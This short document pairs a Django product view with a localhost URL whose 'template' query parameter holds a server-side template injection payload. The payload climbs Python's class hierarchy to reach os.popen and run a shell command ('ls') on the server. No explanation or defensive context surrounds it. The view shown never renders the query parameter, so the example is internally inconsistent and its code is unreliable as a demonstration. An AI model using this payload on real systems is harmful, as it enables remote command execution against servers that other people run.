Source code:

```
from django.shortcuts import render
from django.views import View

class ProductView(View):
    def get(self, request, product_id):
        product = get_product_by_id(product_id)
        template = """
            <html>
                <body>
                    <h1>{{ product.name }}</h1>
                    <p>{{ product.description }}</p>
                    <p>Price: {{ product.price }}</p>
                </body>
            </html>
        """
        return render(request, 'product_detail.html', {'product': product, 'template': template})
```

```http://localhost:8000/product/1/?template={{request.__class__.__mro__[1].__subclasses__()[414].__init__.__globals__['os'].popen('ls').read()}}```
